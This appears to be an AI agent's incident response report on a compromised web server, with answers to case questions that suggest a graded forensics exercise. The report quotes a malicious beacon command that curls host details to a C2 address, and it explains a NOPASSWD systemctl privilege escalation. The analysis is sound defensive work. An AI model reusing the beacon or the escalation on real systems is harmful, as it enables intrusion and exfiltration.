All claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised on **Apr 14, 2026 at 03:17 UTC** via the **deploy** service account. An attacker used a stolen SSH private key to log in from a known C2 server (**185.229.59.103**), then leveraged the account's overly permissive NOPASSWD sudo grant on `systemctl` to install a persistent C2 beacon as a systemd service. No brute force activity was observed; initial access was achieved through a compromised SSH key.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| Apr 14 03:17:44 | SSH login as `deploy` from **185.229.59.103** (publickey, RSA fingerprint SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ) | auth.log:30 |
| Apr 14 03:18:02 | `sudo cat /etc/passwd` — reconnaissance | auth.log:32 |
| Apr 14 03:18:12 | `sudo cp /tmp/update /usr/local/bin/update` — payload staging | auth.log:35 |
| Apr 14 03:18:17 | `sudo chmod +x /usr/local/bin/update` | auth.log:36 |
| Apr 14 03:18:29 | `sudo tee /etc/systemd/system/system-updater.service` — writes C2 beacon unit | auth.log:37 |
| Apr 14 03:18:44 | `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | `sudo systemctl enable system-updater.service` — persistence | auth.log:39 |
| Apr 14 03:19:03 | `sudo systemctl start system-updater.service` — beacon now active | auth.log:40 |
| Apr 14 03:20:51 | SSH session closed | auth.log:41 |

The entire attack took **~3 minutes**.

## Findings

### 1. Initial Access — Stolen SSH Key (INFERENCE)
The attacker authenticated as `deploy` from **185.229.59.103** using the **same RSA key fingerprint** (`SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) used by the legitimate CI runner at 10.0.1.50. There were **zero failed login attempts** in the entire auth log, confirming this was not a brute force attack. The SSH private key was likely stolen from the CI runner or its key store.

### 2. Persistence — Malicious Systemd Service (CONFIRMED)
A systemd unit `system-updater.service` was installed at `/etc/systemd/system/system-updater.service`. It runs as root and executes:
```
/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
This beacons the host's identity to the C2 server every 600 seconds (10 minutes), with `Restart=always` ensuring it survives crashes. It is enabled at boot via `WantedBy=multi-user.target`.

### 3. Payload Staging (CONFIRMED)
The attacker copied `/tmp/update` to `/usr/local/bin/update` and made it executable. This binary was not analyzed (not present in the filesystem snapshot at the expected location), but represents an additional implant beyond the beacon service.

### 4. C2 Infrastructure (CONFIRMED)
**185.229.59.103** is a known C2 server per threat intelligence (tags: c2, beacon; confidence: high). It served as both the attack origin (SSH source) and the beacon destination (port 8443).

### 5. Privilege Escalation Vector (CONFIRMED)
The file `etc/sudoers.d/deploy` grants:
```
deploy  ALL=(root) NOPASSWD: /usr/bin/systemctl
```
This bare `systemctl` NOPASSWD grant is a well-known privilege escalation vector — it allows the deploy user to install arbitrary systemd services that execute as root, which is exactly what the attacker exploited.

### 6. Shell History Analysis (CONFIRMED)
Three shell histories were found and analyzed:
- **root** — 4 commands (apt update, apt upgrade, systemctl restart nginx, tail log). Routine admin. No attacker activity.
- **deploy** — 15 commands (git operations, npm build/test, curl to npmjs.org, docker ps, etc.). Routine CI/CD development. No attacker commands.
- **alice** — 6 commands (ls, cd /var/log, tail nginx access log, journalctl, systemctl status, exit). Routine log inspection. No attacker activity.
- **bob** — Has a user account (uid 1003) but **no .bash_history file** was found in the filesystem snapshot. Bob logged in twice during the period (Apr 13 and Apr 14) and ran apt update/upgrade, per auth.log.

**None of the shell histories contain the attacker's commands.** The attacker's actions are recorded only in the auth.log sudo trail, not in deploy's `.bash_history`. This is consistent with the attacker either using a non-interactive session, clearing the specific commands from history, or using a method that bypassed history recording.

## IOC Summary

| IOC | Type | Context |
|---|---|---|
| 185.229.59.103 | IP (C2 server) | SSH source + beacon destination |
| /etc/systemd/system/system-updater.service | Persistence artifact | C2 beacon unit |
| /usr/local/bin/update | Dropped binary | Staged from /tmp/update |
| SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ | SSH key fingerprint | Compromised deploy key |

## Recommendations

1. **Immediately** disable and remove `system-updater.service`; delete `/usr/local/bin/update`
2. **Rotate** the deploy account's SSH keys and investigate the CI runner (10.0.1.50) for key theft
3. **Restrict** the deploy sudoers grant — replace bare `systemctl` with explicit allowed subcommands (e.g., `systemctl restart nginx`)
4. **Block** 185.229.59.103 at the network perimeter
5. **Investigate** the CI runner host for compromise
6. **Audit** `/tmp` for any remaining attacker artifacts

---

## Case Questions

**Case Q1:** Shell histories were analyzed for three accounts: **root**, **deploy**, and **alice**. A fourth account, **bob** (uid 1003), exists in `/etc/passwd` but had no `.bash_history` file in the filesystem snapshot.

**Case Q2:** No — none of the shell histories show what the attacker did. The attacker's commands (reading `/etc/passwd`, staging a binary, installing and enabling the `system-updater.service` C2 beacon) are recorded only in the **auth.log sudo trail** (lines 32–40), not in any `.bash_history` file. The **deploy** account's `.bash_history` contains only routine CI/CD commands (git, npm, docker, systemctl status) that appear to predate the attack. The attacker either used a non-interactive execution method, explicitly cleared their history entries, or the session did not record to the history file.